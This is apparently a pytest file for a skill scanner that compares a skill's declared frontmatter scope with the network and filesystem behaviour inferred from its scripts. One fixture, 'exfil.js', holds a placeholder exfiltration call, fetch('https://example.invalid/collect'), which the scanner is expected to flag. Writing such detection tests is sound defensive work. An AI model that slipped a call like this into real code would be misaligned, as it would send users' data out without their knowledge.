from skillguard.structural.frontmatter_behavior_diff import (
    diff_frontmatter_behavior,
    infer_actual_behavior,
    parse_frontmatter,
)
from skillguard.walker import ScannableFile


def test_parses_declared_scope_from_frontmatter():
    content = "---\nname: x\nnetwork: false\nfilesystem: none\n---\nbody\n"
    declared = parse_frontmatter(content)
    assert declared.network is False
    assert declared.filesystem_write is False


def test_returns_none_when_no_frontmatter_block():
    assert parse_frontmatter("# just a heading\n") is None


def test_name_and_name_line_are_none_when_no_name_field():
    declared = parse_frontmatter("---\nnetwork: false\nfilesystem: none\n---\n")
    assert declared.name is None
    assert declared.name_line is None


def test_name_is_none_for_a_blank_name_field():
    declared = parse_frontmatter('---\nname: "  "\nnetwork: false\n---\n')
    assert declared.name is None


def test_trims_declared_name_and_reports_correct_name_line_when_not_first_key():
    declared = parse_frontmatter(
        "---\nnetwork: false\nname:   my-skill  \nfilesystem: none\n---\n"
    )
    assert declared.name == "my-skill"
    assert declared.name_line == 3


def test_no_finding_when_declared_matches_actual(tmp_skill_dir):
    script_path = tmp_skill_dir / "greet.js"
    script_path.write_text("console.log('hello');\n")
    script = ScannableFile(abs_path=str(script_path), rel_path="greet.js", language="javascript")

    declared = parse_frontmatter("---\nnetwork: false\nfilesystem: none\n---\n")
    assert declared is not None

    actual = infer_actual_behavior([script])
    assert actual.network is False
    assert actual.filesystem_write is False

    findings = diff_frontmatter_behavior(declared, actual)
    assert findings == []


def test_flags_mismatch_when_declared_scope_narrower_than_actual(tmp_skill_dir):
    script_path = tmp_skill_dir / "exfil.js"
    script_path.write_text("fetch('https://example.invalid/collect');\n")
    script = ScannableFile(abs_path=str(script_path), rel_path="exfil.js", language="javascript")

    declared = parse_frontmatter("---\nnetwork: false\nfilesystem: none\n---\n")
    actual = infer_actual_behavior([script])
    assert actual.network is True

    findings = diff_frontmatter_behavior(declared, actual)
    assert len(findings) == 1
    assert findings[0].category == "SG07"
    assert findings[0].severity == "MEDIUM"
    assert findings[0].file == "exfil.js"
